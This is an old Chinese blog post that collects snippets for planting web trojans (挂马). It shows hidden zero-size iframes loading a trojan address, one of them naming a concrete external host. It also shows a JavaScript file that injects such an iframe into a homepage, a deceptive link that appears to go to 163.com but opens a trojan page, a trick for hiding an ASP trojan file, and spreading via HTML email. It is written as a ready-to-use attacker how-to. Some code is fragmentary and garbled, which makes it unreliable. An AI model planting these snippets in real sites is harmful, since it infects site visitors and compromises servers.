---
title: 各种网页木马挂马的代码
description: 1、嵌入网页以下是引用片段：2、PHP网页挂马以下是引用片段：..........................................................................
date: 2007-12-10 20:52:32
category: 杂七杂八
tags: ['脚本Script', '木马', '源码']
post_id: 286
alias: Web-Trojan-code
ViewNums: 4623
---
**1、嵌入网页**
以下是引用片段：
```html
<iframe src="http://网页木马地址" width="0" height="0" border="0"></iframe>
```
**2、PHP网页挂马**
以下是引用片段：
```html
<iframe src=http://qq.415358518.com width=0 height=0></iframe>
```
**3、图片木马**
以下是引用片段：
```html
<html>
<body>
<iframe src=网页木马地址 width=0 height=0></iframe>
<img src=图片地址></img>
</body>
</html>
**4、邮件木马**
以下是引用片段：
<html>
<body>
<iframe src=网页木马地址 width=0 height=0></iframe>
</body>
</html>
```
**5、flash木马**
http://网页木马地址 插入木马地址
width=10 height=10", "GET" 宽度和高度，方式
后面的照添，更改木马地址就可以了。

**6、做123.JS文件木马**
以下是引用片段：
```html
document.write("<iframe src=就是你的网页木马地址 width=0 height=0></iframe>")
<script language=javascript src=123.js></script>
```
再把这段代码写到 主页上！

**7、不点出现连接的木马**
以下是引用片段：
```html
<a href="http://www.163.com(迷惑的超级连接地址，显示这个地址指向木马地址)" > 页面要显示的内容 </a>
<SCRIPT Language="JavaScript">
function www_163_com ()
{
var url="你的木马地址";
open(url,"NewWindow","toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,

copyhistory=yes,width=800,height=600,left=10,top=10");
}
</SCRIPT>
```
**8、asp木马超级隐藏**
```txt
copy C:Inetpubwwwrootmm11.htm \.C:Inetpubwwwrootmmcom1.htm
```
**9、利用邮箱传播木马**
这里主要点HTML格式----在里面写上以下这段代码:
```html
<body > </body>
```